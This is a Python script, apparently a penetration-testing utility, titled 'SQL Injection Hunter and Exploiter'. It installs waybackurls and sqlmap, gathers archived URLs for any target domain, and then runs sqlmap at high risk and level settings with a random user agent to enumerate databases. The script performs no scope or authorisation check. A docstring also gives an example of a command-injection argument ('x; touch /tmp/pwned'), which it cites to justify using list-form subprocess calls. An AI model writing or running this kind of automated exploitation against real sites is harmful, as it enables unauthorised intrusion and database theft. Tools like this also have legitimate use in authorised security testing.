#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Author: David Espejo (Fortytwo Security)

import argparse
import subprocess
import os
import platform
import shutil
import sys

# Global debug flag
DEBUG = False

# sqlmap against a harvested URL list is legitimately slow.
COMMAND_TIMEOUT = 900

def run_command(argv, *, stdout_path=None, append=False, timeout=COMMAND_TIMEOUT):
    """Execute argv and return (stdout, stderr) as text.

    argv MUST be a list and MUST NOT be run through a shell. The -t/--target and
    -o/--output values come from the command line and are interpolated into the
    command, so a shell string turns `-t 'x; touch /tmp/pwned'` into arbitrary
    code execution. List form passes every element to execve() untouched.
    """
    argv = [str(a) for a in argv]
    if DEBUG:
        print(f"[DEBUG] Executing: {argv}")

    if stdout_path is not None:
        # Replaces the old `cmd > file` / `cmd | tee -a file` shell pipelines.
        mode = "a" if append else "w"
        with open(stdout_path, mode, encoding="utf-8", errors="replace") as fh:
            proc = subprocess.run(
                argv, shell=False, stdout=fh, stderr=subprocess.PIPE, timeout=timeout
            )
        return "", proc.stderr.decode("utf-8", errors="replace")

    proc = subprocess.run(
        argv, shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=timeout
    )
    stdout = proc.stdout.decode("utf-8", errors="replace")
    stderr = proc.stderr.decode("utf-8", errors="replace")
    if DEBUG:
        print(f"[DEBUG] Output:\n{stdout}")
        print(f"[DEBUG] Errors:\n{stderr}")
    return stdout, stderr

def check_and_install_tools():
    tools = {
        "waybackurls": install_waybackurls,
        "sqlmap": install_sqlmap,
    }
    for tool, install in tools.items():
        if shutil.which(tool) is None:
            print(f"[!] {tool} not found. Installing...")
            install()

def install_waybackurls():
    if platform.system() == "Linux" or platform.system() == "Darwin":
        run_command(["go", "install", "github.com/tomnomnom/waybackurls@latest"])
        go_path = os.getenv("GOPATH", os.path.expanduser("~/go"))
        os.environ["PATH"] += os.pathsep + os.path.join(go_path, "bin")
    else:
        print(f"[!] Installation of waybackurls is not supported on this OS. Please install manually.")

def install_sqlmap():
    if platform.system() == "Linux":
        # Two calls instead of the old `apt update && apt install` shell string.
        run_command(["sudo", "apt", "update"])
        run_command(["sudo", "apt", "install", "-y", "sqlmap"])
    elif platform.system() == "Darwin":
        run_command(["brew", "install", "sqlmap"])
    elif platform.system() == "Windows":
        print("[!] Please download and install SQLMap from https://sqlmap.org/ manually.")
    else:
        print(f"[!] Installation of SQLMap is not supported on this OS. Please install manually.")

def fetch_urls_from_archive(domain, output_file):
    print(f"[+] Fetching URLs from archive.org for {domain}...")
    waybackurls = shutil.which("waybackurls")
    if waybackurls is None:
        print("[!] waybackurls is not available; cannot fetch URLs from archive.org.")
        return
    # stdout is redirected by handing subprocess a file handle, not via `> file`.
    stdout, stderr = run_command([waybackurls, "--", domain], stdout_path=output_file)
    if stderr.strip():
        print("Errors fetching URLs from archive.org:")
        print(stderr)
    else:
        print(f"[+] URLs saved to {output_file}")

def main():
    global DEBUG

    parser = argparse.ArgumentParser(description="SQL Injection Hunter and Exploiter")
    parser.add_argument("-t", "--target", required=True, help="Target domain or IP address")
    parser.add_argument("-o", "--output", required=True, help="Output file name")
    parser.add_argument("-D", "--debug", action="store_true", help="Enable debug mode to show detailed output")
    args = parser.parse_args()

    domain = args.target
    output_file = args.output
    DEBUG = args.debug

    if DEBUG:
        print("[DEBUG] Debug mode enabled")

    # Step 1: Check and install necessary tools
    check_and_install_tools()

    # Step 2: Fetch URLs from archive.org
    sqliurls_file = "sqliurls.txt"
    fetch_urls_from_archive(domain, sqliurls_file)

    # Check if the sqliurls.txt file was created and has content
    if not os.path.exists(sqliurls_file) or os.path.getsize(sqliurls_file) == 0:
        print("Error: sqliurls.txt not found or empty. Check if URLs were fetched correctly.")
        return

    # Step 3: Run sqlmap
    print("[+] Running sqlmap on discovered URLs...")
    sqlmap = shutil.which("sqlmap")
    if sqlmap is None:
        print("Error: sqlmap not found. Install it and re-run.")
        return
    stdout, stderr = run_command(
        [sqlmap, "-m", sqliurls_file, "--batch", "--dbs", "--risk", "2", "--level", "5", "--random-agent"]
    )

    # Replaces the old `... | tee -a <output>` pipeline.
    with open(output_file, "a", encoding="utf-8", errors="replace") as fh:
        fh.write(stdout)

    # Print sqlmap output
    print(stdout)
    if stderr:
        print("Errors during SQLMap execution:")
        print(stderr)

    print(f"[+] Results saved to {output_file}")

    # Clean up temporary file
    if os.path.exists(sqliurls_file):
        os.remove(sqliurls_file)

if __name__ == "__main__":
    main()
